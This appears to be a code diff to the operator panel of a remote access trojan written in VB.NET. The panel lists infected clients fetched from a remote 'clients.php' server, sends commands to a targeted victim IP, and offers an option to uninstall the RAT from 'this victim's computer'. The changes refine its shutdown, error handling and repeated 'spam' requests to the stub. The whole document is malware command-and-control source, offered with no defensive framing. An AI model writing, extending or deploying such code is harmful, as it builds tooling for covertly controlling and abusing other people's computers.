@@ -11,6 +11,13 @@ Public Class RatPanel
         CheckForIllegalCrossThreadCalls = False
         ClientListManager.RunWorkerAsync()
     End Sub
+
+    Private Sub RatPanel_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
+        demandsClosing = True
+        ClientListManager.CancelAsync()
+        Environment.Exit(0)
+    End Sub
+
     Private Sub AddLogMessage(message As String)
         Log.Items.Add(message)
     End Sub
@@ -22,8 +29,17 @@ Public Class RatPanel
             Try
                 clientInfoList = Split(New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=cleanit"), "[;;]")
             Catch ex As WebException
-                MsgBox("Unable to connect to the FTP server." & ControlChars.Lf & "FTP: " & My.Settings.vpsurl, MsgBoxStyle.Exclamation)
-                End
+                Dim errMessage = MsgBox("Unable to connect to the FTP server." & vbCrLf &
+                       "FTP: " & My.Settings.vpsurl & vbCrLf & vbCrLf &
+                       "Do you want to modify it ?", MsgBoxStyle.YesNo)
+
+                If errMessage = MsgBoxResult.Yes Then
+                    My.Settings.Reset()
+                    ServerCheck.Show()
+                    Exit While
+                Else
+                    End
+                End If
             End Try
 
             Invoke(Sub() connectedClientsView.Rows.Clear())
@@ -107,11 +123,11 @@ Public Class RatPanel
         Next
 
         If MsgBox(message, MsgBoxStyle.YesNo) = MsgBoxResult.Yes Then
-            For i = 0 To 5
+            For i = 0 To 5 ' Spam request to stub
                 mainWebClient.DownloadString(
                     My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=" & actionType & actionContentParsed
                 )
-
+                System.Threading.Thread.Sleep(50)
             Next
         End If
     End Sub
@@ -165,12 +181,6 @@ Public Class RatPanel
 #End Region
     Private Sub RATUninstallToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RATUninstallToolStripMenuItem.Click
         runDirectPanelCommand("Are you sure you want to reboot the RAT on this victim's computer ?", "uninstallrat", {})
-
-    End Sub
-
-    Private Sub RatPanel_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
-        demandsClosing = True
-        ClientListManager.CancelAsync()
     End Sub
 
 #Region "UnspecificEvents"
@@ -212,8 +222,5 @@ Public Class RatPanel
         If Button1.Text = "EDIT" Then Button1.Text = "SAVE" : TextBox1.Enabled = True Else Button1.Text = "EDIT" : TextBox1.Enabled = False
     End Sub
 
-
-
 #End Region
-
 End Class
